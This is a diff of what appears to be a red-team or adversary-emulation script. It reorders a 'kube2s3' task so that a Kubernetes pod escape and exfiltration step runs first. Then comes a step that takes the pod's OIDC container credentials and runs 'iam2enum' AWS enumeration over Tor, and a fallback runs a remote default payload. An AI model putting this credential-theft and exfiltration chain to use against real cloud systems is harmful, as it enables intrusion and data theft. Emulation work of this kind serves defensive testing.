@@ -669,19 +669,8 @@ echo $BUCKET_URL
                     session.log("credentialed_access_tor complete")
             elif task_name == "kube2s3":
                 csp = "aws"
-                # context here is we're inside pod that has access to s3
-                enum_exfil_prep_creds(csp, "iam2enum")
-                session.log(
-                    "running iam2enum container profile enumeration...")
-                # here we'll have oidc container credentials from the pod
-                credentialed_access_tor(
-                    csp=csp,
-                    jobname="iam2enum",
-                    cwd=f'/iam2enum',
-                    script=f'iam2enum.sh',
-                    args="--profile=container"
-                )
 
+                # run pod escape and exfil kube2s3
                 tmp_dir = Path("/tmp")
                 # create work directory
                 task_path = Path(f"/{task_name}")
@@ -727,6 +716,21 @@ echo $BUCKET_URL
                 else:
                     session.log(
                         f"kube tar not found: /tmp/{os.path.basename(files[0])}")
+
+                # now run iam2enum to retrieve creds for enumeration over tor
+
+                # context here is we're inside pod that has access to s3
+                enum_exfil_prep_creds(csp, "iam2enum")
+                session.log(
+                    "running iam2enum container profile enumeration...")
+                # here we'll have oidc container credentials from the pod
+                credentialed_access_tor(
+                    csp=csp,
+                    jobname="iam2enum",
+                    cwd=f'/iam2enum',
+                    script=f'iam2enum.sh',
+                    args="--profile=container"
+                )
             else:
                 result = run_remote(session, default_payload)
                 session.log(result)
